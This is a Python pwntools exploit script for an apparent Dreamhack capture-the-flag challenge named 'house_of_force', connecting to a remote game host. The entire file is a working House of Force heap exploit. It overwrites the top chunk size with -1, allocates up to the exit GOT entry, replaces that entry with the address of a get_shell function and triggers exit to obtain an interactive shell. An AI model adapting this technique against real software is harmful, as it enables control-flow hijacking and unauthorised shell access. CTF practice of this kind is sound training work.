#!/usr/bin/python3 
from pwn import * 

context.arch = "amd64"
context.log_level = "debug"
context.binary = elf = ELF('./house_of_force')

def add(size, data) -> None:
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter(b'Data: ', data)
    return None

def edit(p_idx, w_idx, value) -> None:
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(p_idx))
    p.sendlineafter(b'idx: ', str(w_idx))
    p.sendlineafter(b'value:', str(value))
    return None 

# p = process('./house_of_force') 
p = remote('host3.dreamhack.games', 18368)
add(0x20, b'aaaa')
leak = int(p.recvuntil(':')[:-1], 16)
log.info("Leak: " + hex(leak))

# Overflow (-1 & 0xffffffff)
edit(0, 9, -1)
offset = elf.got["exit"] - (leak + 0x20)
add(offset, b'aaaa')
add(0x8, p32(elf.symbols["get_shell"]))

# Exit
p.sendlineafter(b'> ', b'3')
p.interactive()
